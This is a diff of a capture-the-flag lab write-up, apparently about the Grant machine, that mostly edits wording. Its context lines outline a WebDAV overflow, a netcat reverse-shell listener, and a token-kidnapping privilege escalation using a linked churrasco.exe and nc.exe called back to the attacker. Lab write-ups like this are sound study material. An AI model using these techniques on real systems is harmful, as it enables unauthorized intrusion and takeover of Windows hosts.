@@ -81,7 +81,7 @@ The machine is very similar to the Granny machine. `WebDAV` is enabled and only 
 
 # Enumeration
 
-We can try to run `davtest` to check if there is some chance to upload files, but the test failed for all of the extensions:
+We can try to run `davtest` to check if there is some chance to upload files, but the test fails for all of the extensions:
 
 ```
 ********************************************************
@@ -129,7 +129,7 @@ If: <http://localhost/aaaaaaa...................
 ................................................
 ```
 
-We get a shell as NT AUTHORITY\Network Service:
+We get a shell as `NT AUTHORITY\Network Service`:
 
 ```
 $ nc -nlvp 8989    
@@ -169,12 +169,11 @@ Access is denied.
 &nbsp;
 
 # Privilege Escalation 
-
 ## Network Service -> SYSTEM
 
-Launching the systeminfo command, we can see that the target machine has only one hotfix update installed, meaning that it is probably vulnerable to different exploits. Like in Granny, we can save that output and pass it to `Windows Exploit Suggester` to check for possible exploits. 
+Launching the `systeminfo` command, we can see that the target machine has only one hotfix update installed, meaning that it is probably vulnerable to different exploits. Like in Granny, we can save that output and pass it to `Windows Exploit Suggester` to check for possible exploits. 
 
-But we already know one working exploit that abuses **Token Kidnapping**, which is an elevation of privilege vulnerability that could allow an attacker to go from authenticated user to *LocalSystem* privileges. An attacker can escalate their privileges on a system if they can control the *SeImpersonatePrivilege* token.  An attacker would need to be executing code in the context of a Windows service to use this exploit.
+But we already know (from Granny) one working exploit that abuses the **Token Kidnapping**, technique which is an elevation of privilege vulnerability that could allow an attacker to go from authenticated user to *LocalSystem* privileges. An attacker can escalate their privileges on a system if they can control the *SeImpersonatePrivilege* token.  An attacker would need to be executing code in the context of a Windows service to use this exploit.
 
 Let's first check the privileges related to our current shell:
 
@@ -201,7 +200,7 @@ The `SeImpersontePrivilege` is enabled, meaning that we can perform the exploit.
 Here is the code-> <https://github.com/Re4son/Churrasco/raw/master/churrasco.exe>
 
 
-In order to obtain a SYSTEM shell, we will first copy the binary exploit and the `nc.exe` executable to the target machine via a `smbserver`. Our goal is to then launch the exploit code specifying a command that will launch `nc` towards our machine:
+In order to obtain a SYSTEM shell, we will first copy the binary exploit and the `nc.exe` executable to the target machine via a `smbserver`. Our goal is to launch the exploit code specifying as a command to execute the `nc` binary that will perform a call towards our machine:
 
 
 ```
